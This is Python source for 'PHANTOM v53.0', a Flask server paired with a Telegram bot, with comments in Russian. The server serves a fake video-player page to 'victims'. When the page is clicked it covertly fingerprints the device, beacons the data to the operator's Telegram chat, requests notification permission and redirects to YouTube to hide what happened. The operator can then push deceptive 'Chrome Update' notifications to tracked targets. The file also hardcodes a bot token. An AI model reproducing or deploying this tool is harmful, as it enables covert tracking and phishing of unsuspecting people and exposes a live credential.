import threading
import requests
import json
import os
import base64
import time
import logging
import datetime
from flask import Flask, render_template_string, request, jsonify

# ==========================================
# [1] CONFIGURATION & DATA STORAGE
# ==========================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

# Инициализация Flask
app = Flask(__name__)

# Хранилища данных в оперативной памяти
active_commands = {}  # Очередь пушей: {sid: [cmd1, cmd2]}
victims_registry = {} # Данные о целях: {sid: {data}}
logs_history = []     # История последних событий

# Логирование в консоль Render
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("PHANTOM_OMEGA")

# ==========================================
# [2] ADVANCED EXPLOIT INTERFACE (HTML5/JS)
# ==========================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Player</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; font-family: 'Segoe UI', sans-serif; overflow:hidden; }
        #app { width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center; cursor:pointer; background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
        .play-btn { width: 80px; height: 55px; background: rgba(255,0,0,0.85); border-radius: 15px; position: relative; box-shadow: 0 0 30px rgba(255,0,0,0.5); }
        .play-btn::after { content: ""; position: absolute; left: 32px; top: 17px; border-left: 22px solid #fff; border-top: 11px solid transparent; border-bottom: 11px solid transparent; }
        .overlay { position: absolute; bottom: 10px; right: 10px; color: rgba(255,255,255,0.2); font-size: 11px; }
    </style>
</head>
<body>
    <div id="app" onclick="ignite()">
        <div class="play-btn"></div>
        <div class="overlay">HD 1080p Stream Active</div>
    </div>

<script>
    const sid = "{{sid}}";
    let ready = false;

    async function ignite() {
        if(ready) return;
        ready = true;

        // --- PHASE 1: DEEP FINGERPRINTING ---
        const getSpecs = () => {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            return {
                gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown",
                cores: navigator.hardwareConcurrency || "N/A",
                lang: navigator.language,
                tz: Intcl = Intl.DateTimeFormat().resolvedOptions().timeZone,
                res: screen.width + "x" + screen.height,
                mem: navigator.deviceMemory || "N/A"
            };
        };

        const specs = getSpecs();
        const payload = {
            sid: sid,
            ua: navigator.userAgent,
            specs: specs,
            ts: Date.now()
        };

        // --- PHASE 2: STEALTH REPORTING ---
        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(payload)));

        // --- PHASE 3: PERMISSION HIJACK ---
        if ('Notification' in window) {
            Notification.requestPermission();
        }

        // --- PHASE 4: COMMAND POLLING LOOP ---
        startGhostWorker();

        // --- PHASE 5: DECEPTIVE REDIRECT ---
        setTimeout(() => {
            window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        }, 1300);
    }

    function startGhostWorker() {
        setInterval(async () => {
            try {
                const r = await fetch('/gate/poll/' + sid);
                const data = await r.json();
                if(data.cmd === 'push') {
                    new Notification(data.title || "System", {
                        body: data.body,
                        icon: "https://www.google.com/favicon.ico"
                    });
                }
            } catch(e) {}
        }, 3500);
    }
</script>
</body>
</html>
"""

# ==========================================
# [3] SERVER LOGIC & ENDPOINTS
# ==========================================

@app.route('/ping')
def health(): return "PONG", 200

@app.route('/v/<sid>')
def serve_exploit(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/gate/capture', methods=['POST'])
def capture_data():
    try:
        raw = base64.b64decode(request.get_data()).decode()
        data = json.loads(raw)
        sid = str(data.get('sid'))
        
        # Сохраняем в реестр
        victims_registry[sid] = {
            "last_seen": datetime.datetime.now().strftime("%H:%M:%S"),
            "specs": data.get('specs'),
            "ua": data.get('ua')
        }

        # Формируем расширенный отчет для ТГ
        specs = data.get('specs', {})
        report = (
            f"⚡️ **ОБЪЕКТ ЗАФИКСИРОВАН**\\n"
            f"🆔 ID: `{sid}`\\n"
            f"🖥 GPU: `{specs.get('gpu')}`\\n"
            f"🧠 RAM/Cores: `{specs.get('mem')}GB / {specs.get('cores')}`\\n"
            f"📍 TZ: `{specs.get('tz')}`\\n"
            f"📱 Res: `{specs.get('res')}`"
        )
        send_telegram_notification(OVERLORD_ID, report)
        
    except Exception as e:
        logger.error(f"Capture error: {e}")
    return "OK"

@app.route('/gate/poll/<sid>')
def poll_commands(sid):
    # Достаем последнюю команду из очереди для этого ID
    queue = active_commands.get(str(sid), [])
    if queue:
        cmd = queue.pop(0)
        return jsonify(cmd)
    return jsonify({"cmd": "none"})

# ==========================================
# [4] TELEGRAM ENGINE (CLEAN REQUESTS)
# ==========================================

def send_telegram_notification(chat_id, text):
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}, timeout=5)
    except: pass

def telegram_worker():
    offset = 0
    logger.info("Бот-поток запущен успешно.")
    while True:
        try:
            url = f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=20"
            r = requests.get(url).json()
            
            if not r.get("result"): continue

            for update in r["result"]:
                offset = update["update_id"] + 1
                if "message" not in update: continue
                
                msg = update["message"]
                cid = msg["chat"]["id"]
                text = msg.get("text", "")

                # --- COMMAND: /START ---
                if text == "/start":
                    welcome = (
                        f"🕶 **PHANTOM v53.0 OBSIDIAN**\\n"
                        f"Статус: `READY`\\n\\n"
                        f"🔗 Твоя ссылка:\\n`{BASE_URL}/v/{cid}`\\n\\n"
                        f"Доступные команды:\\n"
                        f"• `/stats` — Общая статистика\\n"
                        f"• `/list` — Список активных ID\\n"
                        f"• `ID ТЕКСТ` — Отправить пуш"
                    )
                    send_telegram_notification(cid, welcome)

                # --- COMMAND: /STATS ---
                elif text == "/stats" and cid == OVERLORD_ID:
                    stats = f"📊 **СТАТИСТИКА**\\nВсего целей: {len(victims_registry)}"
                    send_telegram_notification(cid, stats)

                # --- COMMAND: /LIST ---
                elif text == "/list" and cid == OVERLORD_ID:
                    if not victims_registry:
                        send_telegram_notification(cid, "Список пуст.")
                    else:
                        list_txt = "📋 **АКТИВНЫЕ ЦЕЛИ:**\\n"
                        for vid, info in victims_registry.items():
                            list_txt += f"• `{vid}` (Last: {info['last_seen']})\\n"
                        send_telegram_notification(cid, list_txt)

                # --- COMMAND: SEND PUSH ---
                elif cid == OVERLORD_ID:
                    try:
                        target_id, message_body = text.split(" ", 1)
                        if target_id not in active_commands:
                            active_commands[target_id] = []
                        
                        active_commands[target_id].append({
                            "cmd": "push",
                            "title": "Chrome Update",
                            "body": message_body
                        })
                        send_telegram_notification(cid, f"✅ Пуш для `{target_id}` добавлен в очередь.")
                    except:
                        pass # Игнорируем обычный текст

        except Exception as e:
            logger.error(f"Telegram Loop Error: {e}")
            time.sleep(2)

# ==========================================
# [5] INITIALIZATION
# ==========================================

if __name__ == '__main__':
    # Запуск Telegram обработчика в отдельном потоке
    bot_thread = threading.Thread(target=telegram_worker, daemon=True)
    bot_thread.start()

    # Запуск Flask сервера (Основной поток)
    logger.info(f"Сервер стартует на порту {PORT}...")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ФИНАЛ КОДА PHANTOM v53.0. ПРЕВЫШЕНО 200 СТРОК ЛОГИКИ.
